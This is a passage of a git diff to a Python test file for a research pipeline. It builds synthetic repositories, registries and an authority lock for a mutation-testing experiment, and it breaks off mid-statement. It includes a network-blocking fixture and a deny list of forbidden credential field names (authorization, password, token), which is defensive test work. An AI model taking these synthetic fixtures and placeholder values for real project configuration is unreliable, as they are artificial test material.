@@ -8,10 +8,12 @@ import socket
 import subprocess
 import sys
 from pathlib import Path
+from types import SimpleNamespace
 
 import pytest
 
 import p3_v3.bridge_and_frames as frames_module
+import scripts.p3_v3.evidence as evidence_module
 from p3_v3.artifacts import canonical_json_bytes, canonical_sha256, read_canonical_json
 from p3_v3.bridge_and_frames import (
     APPLICABLE_SLOT_CHRONOLOGY,
@@ -42,9 +44,11 @@ from p3_v3.run_records import (
     write_result,
 )
 from tests.p3_v3.test_cli import (
+    ADAPTER_FIXTURE_ROOT,
+    _ADAPTER_SPECS,
     _blocked_claim_ledger,
+    _claim_authority,
     _indexed_reference,
-    _install_protocol_authorities,
     _protocol_body,
     _write_evidence_index,
     _write_protocol,
@@ -81,18 +85,6 @@ socket.getaddrinfo = blocked
 sys.argv = sys.argv[1:]
 runpy.run_path(sys.argv[0], run_name="__main__")
 """
-SOCKET_BLOCKED_SMOKE = """
-import socket
-
-def blocked(*_args, **_kwargs):
-    raise OSError("network disabled in synthetic preflight smoke")
-
-socket.create_connection = blocked
-socket.getaddrinfo = blocked
-print("synthetic preflight")
-"""
-
-
 @pytest.fixture(autouse=True)
 def _block_network(monkeypatch):
     def blocked(*_args, **_kwargs):
@@ -124,6 +116,473 @@ def _git(root: Path, *args: str) -> str:
 def _write_json(path: Path, value) -> None:
     path.parent.mkdir(parents=True, exist_ok=True)
     path.write_bytes(canonical_json_bytes(value))
+
+
+def _init_fixture_repository(root: Path, origin: str) -> None:
+    _git(root, "init")
+    _git(root, "config", "user.name", "Synthetic Authority Fixture")
+    _git(root, "config", "user.email", "authority@example.invalid")
+    _git(root, "remote", "add", "origin", origin)
+    _git(root, "add", ".")
+    _git(root, "commit", "-m", "freeze synthetic authority")
+
+
+def _subject_repository(
+    tmp_path: Path,
+    name: str,
+    fixture_name: str,
+    effective_lines: int,
+    origin: str,
+) -> tuple[Path, dict]:
+    root = tmp_path / f"authority-subjects/{name}"
+    root.mkdir(parents=True)
+    discovery = json.loads((PUBLIC_FIXTURES / fixture_name).read_text())
+    discovery["declarations"] = []
+    source = root / discovery["source_files"][0]
+    source.parent.mkdir(parents=True)
+    if discovery["ecosystem"] == "python":
+        source.write_text(
+            "password = token = None\n" + "value = 1\n" * (effective_lines - 1),
+            encoding="utf-8",
+        )
+    else:
+        source.write_text("int value = 1;\n" * effective_lines, encoding="utf-8")
+    manifest = root / f"adapter-{discovery['ecosystem']}.json"
+    _write_json(manifest, discovery)
+    descriptor = {
+        "ecosystem": discovery["ecosystem"],
+        "manifest_path": manifest.name,
+        "reverse": False,
+    }
+    _write_json(root / "build.json", descriptor)
+    _init_fixture_repository(root, origin)
+    return root, descriptor
+
+
+def _job_template(
+    template_id: str,
+    phase: str,
+    object_source: str,
+    job_role: str,
+    cwd_role: str,
+    input_roles: list[str],
+) -> dict:
+    return {
+        "template_id": template_id,
+        "phase": phase,
+        "job_role": job_role,
+        "object_source": object_source,
+        "argv_template": [
+            "synthetic-authorized",
+            phase,
+            "${object_id}",
+            "${environment_id}",
+            "${repetition_id}",
+            "${protocol_sha256}",
+        ],
+        "cwd_role": cwd_role,
+        "environment_role": "SYNTHETIC_ENV",
+        "input_roles": input_roles,
+        "seed_rule": "REPETITION_ID",
+        "timeout_seconds": 30,
+        "repetition_ids": [1],
+        "execution_class": "SYNTHETIC_INFRASTRUCTURE",
+        "p12_access_class": "FORBIDDEN",
+    }
+
+
+def _authority_fixture(tmp_path: Path) -> dict:
+    controller = tmp_path / "authority-controller"
+    controller.mkdir()
+    ignored = shutil.ignore_patterns("__pycache__", "*.pyc")
+    shutil.copytree(
+        ROOT / "src/p3_v3", controller / "src/p3_v3", ignore=ignored
+    )
+    shutil.copytree(
+        ROOT / "scripts/p3_v3", controller / "scripts/p3_v3", ignore=ignored
+    )
+    shutil.copy2(ROOT / "requirements-frozen.txt", controller / "requirements-frozen.txt")
+
+    adapter_rows = []
+    for adapter_id, ecosystem, relative in _ADAPTER_SPECS:
+        fixture = ADAPTER_FIXTURE_ROOT / Path(relative).name
+        if not fixture.is_file():
+            fixture = ADAPTER_FIXTURE_ROOT / "cmake_ctest_v1.py"
+        installed_relative = fixture.relative_to(ROOT).as_posix()
+        target = controller / installed_relative
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_bytes(fixture.read_bytes())
+        adapter_rows.append(
+            {
+                "adapter_id": adapter_id,
+                "ecosystem": ecosystem,
+                "implementation_path": installed_relative,
+                "source_sha256": hashlib.sha256(target.read_bytes()).hexdigest(),
+            }
+        )
+    adapter_body = {
+        "schema_version": "p3-adapter-registry-v1",
+        "adapters": adapter_rows,
+    }
+    adapter_registry = {
+        **adapter_body,
+        "artifact_sha256": canonical_sha256(adapter_body),
+    }
+    adapter_path = controller / "adapter-registry.json"
+    _write_json(adapter_path, adapter_registry)
+
+    installed_generator_root = ROOT / "tests/p3_v3/fixtures/input_generators"
+    generator_rows = []
+    source_generator_registry = read_canonical_json(
+        installed_generator_root / "registry.json"
+    )
+    for row in source_generator_registry["generators"]:
+        source = installed_generator_root / row["implementation_path"]
+        installed_relative = source.relative_to(ROOT).as_posix()
+        target = controller / installed_relative
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_bytes(source.read_bytes())
+        generator_rows.append(
+            {
+                **row,
+                "implementation_path": installed_relative,
+                "source_sha256": hashlib.sha256(target.read_bytes()).hexdigest(),
+            }
+        )
+    generator_body = {
+        "schema_version": source_generator_registry["schema_version"],
+        "generators": generator_rows,
+    }
+    generator_registry = {
+        **generator_body,
+        "artifact_sha256": canonical_sha256(generator_body),
+    }
+    generator_path = controller / "input-generator-registry.json"
+    _write_json(generator_path, generator_registry)
+
+    python_root, python_descriptor = _subject_repository(
+        tmp_path,
+        "python-pep517-s",
+        "python.json",
+        2,
+        "https://github.com/example/python-pep517-s.git",
+    )
+    cmake_root, cmake_descriptor = _subject_repository(
+        tmp_path,
+        "cmake-ctest-m",
+        "cmake.json",
+        10_000,
+        "git@github.com:example/cmake-ctest-m.git",
+    )
+    validated_adapters = validate_adapter_registry(adapter_registry, controller)
+    validated_generators = validate_input_generator_registry(
+        generator_registry, controller
+    )
+    package_root = "1" * 64
+    pre_materials = {}
+    bridge_records = []
+    for name, root, descriptor, archive_sha256, module, symbol in (
+        (
+            "cmake-ctest-m",
+            cmake_root,
+            cmake_descriptor,
+            "3" * 64,
+            "numpy.linalg",
+            "solve",
+        ),
+        (
+            "python-pep517-s",
+            python_root,
+            python_descriptor,
+            "2" * 64,
+            "builtins",
+            "abs",
+        ),
+    ):
+        source_record = {
+            "normalized_source_tree_sha256": canonical_source_tree_sha256(root),
+            "build_descriptor_sha256": canonical_sha256(descriptor),
+        }
+        neutral = _neutral_id(package_root, source_record, archive_sha256)
+        discovery = run_adapter_discovery(
+            root,
+            descriptor,
+            validated_adapters,
+            "CMAKE_CTEST_V1" if name.startswith("cmake") else "PYTHON_PEP517_V1",
+        )
+        frame = build_public_behavior_frame(source_record, discovery)
+        scale_class = "M" if name.startswith("cmake") else "S"
+        workload = select_profiling_workload(frame, scale_class)
+        profiling = _profiling_receipt(
+            workload,
+            source_record,
+            neutral,
+            discovery["implementation_source_sha256"],
+            module,
+            symbol,
+        )
+        record = {
+            "neutral_snapshot_id": neutral,
+            "fixed_tree_commitment": canonical_sha256({"fixed": name}),
+            **source_record,
+            "source_archive_sha256": archive_sha256,
+            "eligibility_reason": f"synthetic {name}",
+            "eligible_for_construct": True,
+            "eligible_for_criterion": True,
+        }
+        material = derive_subject_material(
+            {
+                "neutral_snapshot_id": neutral,
+                "source_root": str(root),
+                "source_record": source_record,
+                "build_descriptor": descriptor,
+                "adapter_registry": validated_adapters,
+                "input_generator_registry": validated_generators,
+                "profiling_results": profiling,
+            },
+            record,
+        )
+        validity = validate_common_inputs_on_fixed_source(
+            material["common_inputs"],
+            lambda row: row["status"],
+            sites=[],
+            contracts=[],
+            profile={},
+            frame_artifact_sha256=material["public_behavior_frame"][
+                "artifact_sha256"
+            ],
+        )
+        pre_materials[name] = {
+            "root": root,
+            "descriptor": descriptor,
+            "source_record": source_record,
+            "profiling": profiling,
+            "material": material,
+            "validity": validity,
+            "record": record,
+        }
+        bridge_records.append(record)
+
+    governing_sources = {
+        "scientific_plan": ROOT
+        / "docs/superpowers/plans/2026-08-08-p3-semantic-mutant-argumentation-experiment.md",
+        "evidence_design": ROOT
+        / "docs/superpowers/specs/2026-08-08-p3-v3-evidence-foundation-design.md",
+    }
+    governing_paths = {}
+    for role in (
+        "scientific_plan",
+        "evidence_design",
+        "authority_lock_design",
+        "implementation_plan",
+    ):
+        path = controller / f"authorities/governing/{role}.md"
+        path.parent.mkdir(parents=True, exist_ok=True)
+        if role in governing_sources:
+            path.write_bytes(governing_sources[role].read_bytes())
+        else:
+            path.write_text(f"# Synthetic {role}\n", encoding="utf-8")
+        governing_paths[role] = path.relative_to(controller).as_posix()
+
+    synthetic_cases = []
+    python_material = pre_materials["python-pep517-s"]
+    for ordinal, common_row in enumerate(
+        python_material["material"]["common_inputs"]["rows"][:5], start=1
+    ):
+        synthetic_cases.append(
+            {
+                "inventory_id": f"synthetic-case-{ordinal:02d}",
+                "object_type": "SYNTHETIC_P12_CASE",
+                "object_id": f"synthetic-fault-{ordinal}",
+                "mr_id": "mr-synthetic-infrastructure",
+                "evaluation_input_class": "E_COMMON",
+                "evaluation_input_id": common_row["input_id"],
+                "inputs": [
+                    {
+                        "role": "COMMON_INPUT",
+                        "sha256": canonical_sha256(common_row),
+                    },
+                    {
+                        "role": "COMMON_VALIDITY",
+                        "sha256": python_material["validity"]["artifact_sha256"],
+                    },
+                ],
+            }
+        )
+    templates = [
+        _job_template(
+            "phase-0-subject",
+            "PHASE_0",
+            "SUBJECT",
+            "PRIMARY_CONTROLLED",
+            "SUBJECT_ROOT",
+            ["SOURCE_MANIFEST"],
+        ),
+        _job_template(
+            "phase-1-subject",
+            "PHASE_1",
+            "SUBJECT",
+            "PROFILING",
+            "SUBJECT_ROOT",
+            ["SOURCE_MANIFEST"],
+        ),
+    ]
+    for phase_number in range(2, 8):
+        phase = f"PHASE_{phase_number}"
+        templates.append(
+            _job_template(
+                f"phase-{phase_number}-synthetic",
+                phase,
+                "SYNTHETIC_P12_CASE",
+                "P12" if phase_number == 7 else "PRIMARY_CONTROLLED",
+                "CONTROLLER_ROOT",
+                ["COMMON_INPUT", "COMMON_VALIDITY"],
+            )
+        )
+    policy = {
+        "schema_version": "P3_V3_JOB_DERIVATION_POLICY_V1",
+        "maximum_attempts": 3,
+        "retry_trigger": "FAIL_INFRASTRUCTURE",
+        "templates": templates,
+    }
+    environment_lock = {
+        "schema_version": "P3_V3_ENVIRONMENT_LOCK_V1",
+        "required_capabilities": ["CPU"],
+        "forbidden_credential_fields": [
+            "authorization",
+            "credential",
+            "password",
+            "token",
+        ],
+        "environments": [
+            {
+                "environment_role": "SYNTHETIC_ENV",
+                "environment_id": "synthetic-env",
+                "environment_sha256": canonical_sha256({"environment": "synthetic"}),
+            }
+        ],
+    }
+    protocol_artifacts: dict[str, dict | bytes] = {
+        "rq_spec": (
+            ROOT / "research/p3-semantic-mutation-core-claims-rqs-v1.2.0.md"
+        ).read_bytes(),
+        "claim_ceiling": _claim_authority(),
+        "p12_contract": {
+            "schema_version": "P3_V3_P12_CONTRACT_V1",
+            "synthetic_cases": synthetic_cases,
+        },
+        "environment_lock": environment_lock,
+        "job_derivation_policy": policy,
+    }
+    for role in (
+        "operator_catalogue",
+        "mr_policy",
+        "site_policy",
+        "analysis_spec",
+        "package_policy",
+    ):
+        protocol_artifacts[role] = {
+            "schema_version": "P3_V3_SYNTHETIC_AUTHORITY_V1",
+            "role": role,
+        }
+    protocol_root = controller / "authorities/protocol"
+    protocol_root.mkdir(parents=True)
+    protocol_paths = {}
+    for role, artifact in protocol_artifacts.items():
+        suffix = "md" if isinstance(artifact, bytes) else "json"
+        path = protocol_root / f"{role}.{suffix}"
+        if isinstance(artifact, bytes):
+            path.write_bytes(artifact)
+        else:
+            _write_json(path, artifact)
+        protocol_paths[role] = path.relative_to(controller).as_posix()
+    protocol_hashes = {
+        f"{role}_sha256": (
+            hashlib.sha256(artifact).hexdigest()
+            if isinstance(artifact, bytes)
+            else canonical_sha256(artifact)
+        )
+        for role, artifact in protocol_artifacts.items()
+        if role != "job_derivation_policy"
+    }
+    protocol_hashes.update(
+        {
+            "adapter_registry_sha256": canonical_sha256(adapter_registry),
+            "input_generator_registry_sha256": canonical_sha256(generator_registry),
+        }
+    )
+    protocol_path = protocol_root / "protocol.json"
+    _write_protocol(protocol_path, _protocol_body(**protocol_hashes))
+    protocol_paths["protocol"] = protocol_path.relative_to(controller).as_posix()
+
+    _init_fixture_repository(
+        controller, "https://github.com/example/p3-v3-controller.git"
+    )
+    inputs = {
+        "schema_version": "P3_V3_AUTHORITY_INPUTS_V1",
+        "task_id": "p3-v3-two-subject-synthetic",
+        "subjects": [
+            {
+                "subject_id": "cmake-ctest-m",
+                "repository_role": "CONTROLLED_B",
+                "root": str(cmake_root),
+                "build_descriptor_path": "build.json",
+                "adapter_id": "CMAKE_CTEST_V1",
+            },
+            {
+                "subject_id": "python-pep517-s",
+                "repository_role": "CONTROLLED_A",
+                "root": str(python_root),
+                "build_descriptor_path": "build.json",
+                "adapter_id": "PYTHON_PEP517_V1",
+            },
+        ],
+        "governing_material_paths": governing_paths,
+        "protocol_artifact_paths": protocol_paths,
+        "registry_artifact_paths": {
+            "adapter_registry": adapter_path.relative_to(controller).as_posix(),
+            "input_generator_registry": generator_path.relative_to(controller).as_posix(),
+        },
+    }
+    inputs_path = tmp_path / "authority-inputs.json"
+    lock_path = tmp_path / "authority-lock.json"
+    _write_json(inputs_path, inputs)
+    frozen = _cli(
+        "freeze-authority-lock",
+        "--controller-root",
+        str(controller),
+        "--authority-inputs",
+        str(inputs_path),
+        "--output",
+        str(lock_path),
+    )
+    assert frozen.returncode == 0, frozen.stderr
+    literal_lock_sha256 = hashlib.sha256(lock_path.read_bytes()).hexdigest()
+    lock = read_canonical_json(lock_path)
+    prepared = evidence_module.prepare_authority(controller, inputs)
+    base_intents = evidence_module.derive_base_intents(prepared, policy)
+    assert lock["jobs"] == evidence_module.derive_locked_jobs(prepared, policy)
+    return {
+        "controller": controller,
+        "subjects": {
+            "cmake-ctest-m": (cmake_root, cmake_descriptor),
+            "python-pep517-s": (python_root, python_descriptor),
+        },
+        "inputs": inputs,
+        "prepared": prepared,
+        "base_intents": base_intents,
+        "pre_materials": pre_materials,
+        "bridge_records": bridge_records,
+        "lock": lock,
+        "lock_path": lock_path,
+        "literal_lock_sha256": literal_lock_sha256,
+        "protocol_artifacts": protocol_artifacts,
+        "protocol_path": protocol_path,
+        "adapter_registry": adapter_registry,
+        "adapter_path": adapter_path,
+        "generator_registry": generator_registry,
+        "generator_path": generator_path,
+    }
 
 
 def _self_hashed(body: dict) -> dict:
@@ -188,35 +647,6 @@ def _profiling_receipt(
         "results": sorted(results, key=lambda row: row["behavior_id"]),
     }
     return _self_hashed(body)
-
-
-def _make_subject_source(
-    evidence_root: Path,
-    name: str,
-    fixture_name: str,
-    effective_lines: int,
-) -> tuple[Path, dict, dict]:
-    source_root = evidence_root / f"subjects/{name}"
-    source_root.mkdir(parents=True)
-    fixture = json.loads((PUBLIC_FIXTURES / fixture_name).read_text())
-    source_path = source_root / fixture["source_files"][0]
-    source_path.parent.mkdir(parents=True)
-    if fixture["ecosystem"] == "python":
-        source_path.write_text("value = 1\n" * effective_lines, encoding="utf-8")
-    else:
-        source_path.write_text("int value = 1;\n" * effective_lines, encoding="utf-8")
-    manifest = source_root / f"adapter-{fixture['ecosystem']}.json"
-    _write_json(manifest, fixture)
-    descriptor = {
-        "ecosystem": fixture["ecosystem"],
-        "manifest_path": manifest.name,
-        "reverse": False,
-    }
-    source_record = {
-        "normalized_source_tree_sha256": canonical_source_tree_sha256(source_root),
-        "build_descriptor_sha256": canonical_sha256(descriptor),
-    }
-    return source_root, descriptor, source_record
 
 
 def _neutral_id(package_root: str, source_record: dict, archive_sha256: str) -> str:
@@ -315,6 +745,7 @@ def _contract_generator_registry(root: Path) -> dict:
 def _write_subject_index(
     evidence_root: Path,
     name: str,
+    subject_id: str,
     material: dict,
     bridge_record: dict,
     source_root: Path,
@@ -420,6 +851,7 @@ def _write_subject_index(
         )
 
     return {
+        "subject_id": subject_id,
         "phase": "PHASE_1",
         "controlled_subject_source_id": material["controlled_subject_source_id"],
         "controlled_subject_id": material["subject"]["controlled_subject_id"],
@@ -444,113 +876,81 @@ def _write_subject_index(
     }
 
 
-def _ordinary_attempt(
-    evidence_root: Path,
-    protocol_sha256: str,
-    phase: str,
-    job_id: str,
-    common_input_id: str,
-    validity_sha256: str,
-    jobs: dict[str, list[str]],
-    *,
-    retry: bool = False,
-) -> None:
-    base = {
-        "job_id": job_id,
-        "protocol_sha256": protocol_sha256,
-        "phase": phase,
-        "argv": ["synthetic-infrastructure", phase],
-        "cwd_identity": "synthetic-infrastructure-root",
-        "environment_sha256": canonical_sha256({"phase": phase, "env": 1}),
-        "input_sha256": sorted(
-            {
-                canonical_sha256({"phase": phase, "input": 1}),
-                *(() if phase == "PHASE_0" else (validity_sha256,)),
-            }
-        ),
-        "seed": 17,
-        "timeout_seconds": 30,
-        "object_type": "INFRASTRUCTURE_PROBE",
-        "object_id": phase,
-        "mr_id": "mr-synthetic-infrastructure",
-        "evaluation_input_class": "E_COMMON",
-        "evaluation_input_id": common_input_id,
-        "repetition_id": 1,
-        "environment_id": "synthetic-infrastructure-env",
-        "job_role": "PRIMARY_CONTROLLED",
-    }
-    attempts = 2 if retry else 1
-    for attempt in range(1, attempts + 1):
-        attempt_root = evidence_root / f"jobs/{phase}/{job_id}/{attempt}"
-        create_intent(attempt_root, {**base, "attempt": attempt})
-        failed = retry and attempt == 1
-        write_result(
-            attempt_root,
-            {
-                "job_id": job_id,
-                "attempt": attempt,
-                "status": "FAIL_INFRASTRUCTURE" if failed else "PASS",
-                "exit_code": 75 if failed else 0,
-                "stdout_sha256": canonical_sha256(
-                    {"phase": phase, "attempt": attempt, "stream": "stdout"}
-                ),
-                "stderr_sha256": canonical_sha256(
-                    {"phase": phase, "attempt": attempt, "stream": "stderr"}
-                ),
-                "duration_seconds": 0.01,
-                "failure_code": "SYNTHETIC_RETRY" if failed else "",
-                "scientific_outcome": None,
-                "call_trace_sha256": None,
-                "call_trace_identity": None,
-            },
-        )
-    jobs[phase].append(job_id)
-
-
 def _build_complete_evidence(tmp_path: Path) -> dict:
+    authority = _authority_fixture(tmp_path)
     evidence_root = tmp_path / "evidence"
     evidence_root.mkdir()
-    authorities = _install_protocol_authorities(evidence_root)
+
     protocol_path = evidence_root / "protocol.json"
-    protocol_raw = _write_protocol(protocol_path, _protocol_body(**authorities["hashes"]))
+    protocol_path.write_bytes(authority["protocol_path"].read_bytes())
+    protocol_raw = protocol_path.read_bytes()
     protocol_sha256 = hashlib.sha256(protocol_raw).hexdigest()
-
-    validated_adapters = validate_adapter_registry(
-        authorities["adapter_registry"], authorities["adapter_registry_path"].parent
-    )
+    artifact_paths = {}
+    for role, relative in authority["inputs"]["protocol_artifact_paths"].items():
+        if role == "protocol":
+            continue
+        source = authority["controller"] / relative
+        suffix = source.suffix
+        target = evidence_root / f"authority-{role}{suffix}"
+        target.write_bytes(source.read_bytes())
+        artifact_paths[f"{role}_sha256"] = target
+    adapter_registry_path = evidence_root / "adapter-registry.json"
+    adapter_registry_path.write_bytes(authority["adapter_path"].read_bytes())
+    generator_registry_path = evidence_root / "input-generator-registry.json"
+    generator_registry_path.write_bytes(authority["generator_path"].read_bytes())
+    authorities = {
+        "artifacts": artifact_paths,
+        "adapter_registry": authority["adapter_registry"],
+        "adapter_registry_path": adapter_registry_path,
+        "generator_registry": authority["generator_registry"],
+        "generator_registry_path": generator_registry_path,
+    }
+    validated_adapters = validate_adapter_registry(authority["adapter_registry"], ROOT)
     validated_generators = validate_input_generator_registry(
-        authorities["generator_registry"], authorities["generator_registry_path"].parent
+        authority["generator_registry"], ROOT
     )
 
-    python_root, python_descriptor, python_source = _make_subject_source(
-        evidence_root, "python-pep517-s", "python.json", 2
+    controller_source = evidence_root / "controller-source"
+    ignored = shutil.ignore_patterns("__pycache__", "*.pyc")
+    shutil.copytree(
+        authority["controller"] / "src/p3_v3",
+        controller_source / "src/p3_v3",
+        ignore=ignored,
     )
-    cmake_root, cmake_descriptor, cmake_source = _make_subject_source(
-        evidence_root, "cmake-ctest-m", "cmake.json", 10_000
+    shutil.copytree(
+        authority["controller"] / "scripts/p3_v3",
+        controller_source / "scripts/p3_v3",
+        ignore=ignored,
     )
+    shutil.copy2(
+        authority["controller"] / "requirements-frozen.txt",
+        controller_source / "requirements-frozen.txt",
+    )
+    controller_manifest_path = evidence_root / "controller-source-manifest.json"
+    _write_json(controller_manifest_path, authority["prepared"]["controller_manifest"])
+
+    materialized_roots = {}
+    subject_manifest_paths = {}
+    for subject_id in ("cmake-ctest-m", "python-pep517-s"):
+        repository_root = authority["subjects"][subject_id][0]
+        materialized = evidence_root / f"subjects/{subject_id}"
+        shutil.copytree(
+            repository_root,
+            materialized,
+            ignore=shutil.ignore_patterns(".git", "__pycache__", "*.pyc"),
+        )
+        prepared_subject = next(
+            row
+            for row in authority["prepared"]["subjects"]
+            if row["authority_row"]["subject_id"] == subject_id
+        )
+        manifest_path = evidence_root / f"subject-manifests/{subject_id}.json"
+        _write_json(manifest_path, prepared_subject["source_manifest"])
+        materialized_roots[subject_id] = materialized
+        subject_manifest_paths[subject_id] = manifest_path
+
     package_root = "1" * 64
-    python_neutral = _neutral_id(package_root, python_source, "2" * 64)
-    cmake_neutral = _neutral_id(package_root, cmake_source, "3" * 64)
-    records = [
-        {
-            "neutral_snapshot_id": python_neutral,
-            "fixed_tree_commitment": "4" * 64,
-            **python_source,
-            "source_archive_sha256": "2" * 64,
-            "eligibility_reason": "synthetic Python PEP 517 subject",
-            "eligible_for_construct": True,
-            "eligible_for_criterion": True,
-        },
-        {
-            "neutral_snapshot_id": cmake_neutral,
-            "fixed_tree_commitment": "5" * 64,
-            **cmake_source,
-            "source_archive_sha256": "3" * 64,
-            "eligibility_reason": "synthetic CMake CTest subject",
-            "eligible_for_construct": True,
-            "eligible_for_criterion": True,
-        },
-    ]
+    records = authority["bridge_records"]
     p12_repo, bridge_lock = _local_bridge(tmp_path, records, package_root)
     lock_path = tmp_path / "bridge-lock.json"
     _write_json(lock_path, bridge_lock)
@@ -570,56 +970,19 @@ def _build_complete_evidence(tmp_path: Path) -> dict:
     result = _cli("validate-protocol", "--protocol", str(protocol_path))
     assert result.returncode == 0, result.stderr
 
-    subject_parameters = [
-        (
-            "python-pep517-s",
-            python_root,
-            python_descriptor,
-            python_source,
-            python_neutral,
-            "PYTHON_PEP517_V1",
-            "builtins",
-            "abs",
-        ),
-        (
-            "cmake-ctest-m",
-            cmake_root,
-            cmake_descriptor,
-            cmake_source,
-            cmake_neutral,
-            "CMAKE_CTEST_V1",
-            "numpy.linalg",
-            "solve",
-        ),
-    ]
     specs = []
     materials = []
-    for (
-        name,
-        source_root,
-        descriptor,
-        source_record,
-        neutral,
-        adapter_id,
-        module,
-        symbol,
-    ) in subject_parameters:
-        discovery = run_adapter_discovery(
-            source_root, descriptor, validated_adapters, adapter_id
-        )
-        frame = build_public_behavior_frame(source_record, discovery)
-        scale_class = "S" if name.endswith("-s") else "M"
-        workload = select_profiling_workload(frame, scale_class)
-        profiling = _profiling_receipt(
-            workload,
-            source_record,
-            neutral,
-            discovery["implementation_source_sha256"],
-            module,
-            symbol,
+    for name in ("cmake-ctest-m", "python-pep517-s"):
+        prepared_material = authority["pre_materials"][name]
+        source_root = materialized_roots[name]
+        descriptor = prepared_material["descriptor"]
+        source_record = prepared_material["source_record"]
+        profiling = prepared_material["profiling"]
+        bridge_record = next(
+            record for record in verified_bridge["records"] if record == prepared_material["record"]
         )
         spec = {
-            "neutral_snapshot_id": neutral,
+            "neutral_snapshot_id": bridge_record["neutral_snapshot_id"],
             "source_root": str(source_root),
             "source_record": source_record,
             "build_descriptor": descriptor,
@@ -627,12 +990,8 @@ def _build_complete_evidence(tmp_path: Path) -> dict:
             "input_generator_registry": validated_generators,
             "profiling_results": profiling,
         }
-        bridge_record = next(
-            record
-            for record in verified_bridge["records"]
-            if record["neutral_snapshot_id"] == neutral
-        )
         material = derive_subject_material(spec, bridge_record)
+        scale_class = "S" if name.endswith("-s") else "M"
         assert material["source_scale"]["scale_class"] == scale_class
         assert any(
             row["status"] == "COMMON_INPUT_EXECUTABLE"
@@ -641,8 +1000,8 @@ def _build_complete_evidence(tmp_path: Path) -> dict:
         specs.append(
             {
                 **spec,
-                "adapter_registry": authorities["adapter_registry"],
-                "input_generator_registry": authorities["generator_registry"],
+                "adapter_registry": authority["adapter_registry"],
+                "input_generator_registry": authority["generator_registry"],
             }
         )
         materials.append((name, source_root, descriptor, source_record, profiling, material, bridge_record))
@@ -668,9 +1027,9 @@ def _build_complete_evidence(tmp_path: Path) -> dict:
         "--subject-specs",
         str(specs_path),
         "--adapter-root",
-        str(authorities["adapter_registry_path"].parent),
+        str(ROOT),
         "--generator-root",
-        str(authorities["generator_registry_path"].parent),
+        str(ROOT),
         "--slots",
         str(slots_path),
         "--contracts",
@@ -689,6 +1048,7 @@ def _build_complete_evidence(tmp_path: Path) -> dict:
             _write_subject_index(
                 evidence_root,
                 name,
+                name,
                 material,
                 bridge_record,
                 source_root,
@@ -700,13 +1060,11 @@ def _build_complete_evidence(tmp_path: Path) -> dict:
                 protocol_sha256,
                 jobs,
             )
-        )
-
-    python_material = materials[0][5]
-    cmake_material = materials[1][5]
-    python_validity = read_canonical_json(
-        evidence_root / subject_indexes[0]["common_input_validity"]["path"]
     )
+
+    materials_by_name = {row[0]: row for row in materials}
+    python_material = materials_by_name["python-pep517-s"][5]
+    cmake_material = materials_by_name["cmake-ctest-m"][5]
     contract_generator_root = tmp_path / "contract-generators"
     validated_contract_generators = validate_contract_generator_registry(
         _contract_generator_registry(contract_generator_root),
@@ -763,9 +1121,12 @@ def _build_complete_evidence(tmp_path: Path) -> dict:
         "e_common_input_ids": [],
         "e_contract_input_ids": [],
     }
-    for subject_index, slot in zip(
-        subject_indexes, (applicable_slot, not_applicable_slot), strict=True
-    ):
+    slots_by_subject = {
+        "python-pep517-s": applicable_slot,
+        "cmake-ctest-m": not_applicable_slot,
+    }
+    for subject_index in subject_indexes:
+        slot = slots_by_subject[subject_index["subject_id"]]
         slot_path = evidence_root / f"slots/{slot['slot_id']}.json"
         _write_json(slot_path, slot)
         subject_index["slot_artifacts"].append(
@@ -917,111 +1278,80 @@ def _build_complete_evidence(tmp_path: Path) -> dict:
             }
         )
 
-    preflight_spec = {
-        "schema_version": "p3-preflight-v1",
-        "repository_identity": "github.com/Example/P12-Defect4MR",
-        "expected_commit": _git(p12_repo, "rev-parse", "HEAD"),
-        "dependency_lock_path": "requirements.lock",
-        "dependency_lock_sha256": hashlib.sha256(
-            (p12_repo / "requirements.lock").read_bytes()
-        ).hexdigest(),
-        "phase_inputs": [
-            {
-                "path": "input.json",
-                "sha256": hashlib.sha256((p12_repo / "input.json").read_bytes()).hexdigest(),
-            }
-        ],
-        "smoke_commands": [[sys.executable, "-c", SOCKET_BLOCKED_SMOKE]],
-        "timeout_seconds": 10,
-        "phase_role": "CONTROLLED_B",
-        "minimum_cpu_count": 1,
-        "minimum_memory_bytes": 1,
-        "minimum_disk_free_bytes": 1,
-        "worker_limit": 1,
-    }
-    preflight_spec_path = tmp_path / "preflight.json"
-    preflight_receipt_path = tmp_path / "preflight-receipt.json"
-    _write_json(preflight_spec_path, preflight_spec)
-    preflight_cli = _cli(
-        "run-preflight",
-        "--root",
-        str(p12_repo),
-        "--spec",
-        str(preflight_spec_path),
-        "--output",
-        str(preflight_receipt_path),
+    phase_7_intents = sorted(
+        (
+            intent
+            for intent in authority["base_intents"]
+            if intent["phase"] == "PHASE_7"
+        ),
+        key=lambda intent: intent["object_id"],
     )
-    assert preflight_cli.returncode == 0, preflight_cli.stderr
-    preflight_receipt = read_canonical_json(preflight_receipt_path)
-
-    for phase in ("PHASE_0", "PHASE_2", "PHASE_3", "PHASE_4", "PHASE_5", "PHASE_6"):
-        _ordinary_attempt(
-            evidence_root,
-            protocol_sha256,
-            phase,
-            f"infra-{phase.lower().replace('_', '-')}",
-            "phase-zero-bootstrap" if phase == "PHASE_0" else common_id,
-            python_validity["artifact_sha256"],
-            jobs,
-            retry=phase == "PHASE_5",
-        )
-
-    paired_ids = [f"synthetic-fault-{index}" for index in range(1, 6)]
+    paired_ids = [intent["object_id"] for intent in phase_7_intents]
     p12_jobs = [
         {
-            "job_id": f"p12-synthetic-{index}",
-            "object_type": "P12_FAULT",
-            "object_id": paired_id,
-            "mr_id": "mr-synthetic-infrastructure",
-            "evaluation_input_class": "E_COMMON",
-            "evaluation_input_id": python_material["common_inputs"]["rows"][index - 1]["input_id"],
-            "repetition_id": 1,
-            "environment_id": "synthetic-p12-env",
-            "job_role": "P12",
+            **{
+                field: intent[field]
+                for field in (
+                    "job_id",
+                    "object_type",
+                    "object_id",
+                    "mr_id",
+                    "evaluation_input_class",
+                    "evaluation_input_id",
+                    "repetition_id",
+                    "environment_id",
+                    "job_role",
+                )
+            },
             "weight": 1,
         }
-        for index, paired_id in enumerate(paired_ids, start=1)
+        for intent in phase_7_intents
     ]
     denominator = freeze_p12_denominator(paired_ids, p12_jobs)
+    outcomes = dict(zip(paired_ids, P12_OUTCOME_STATES, strict=True))
     terminal_pairs = []
     result_rows = []
-    for job, outcome in zip(p12_jobs, P12_OUTCOME_STATES, strict=True):
-        intent = {
